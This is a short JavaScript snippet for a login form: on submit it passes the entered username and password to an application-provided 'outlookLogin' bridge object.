
function sendForm(event) {
	event.preventDefault();
	window.outlookLogin.submit({
		username: document.getElementById('username').value,
		password: document.getElementById('password').value,
	});
}

document.getElementById('login-form').addEventListener('submit', sendForm);
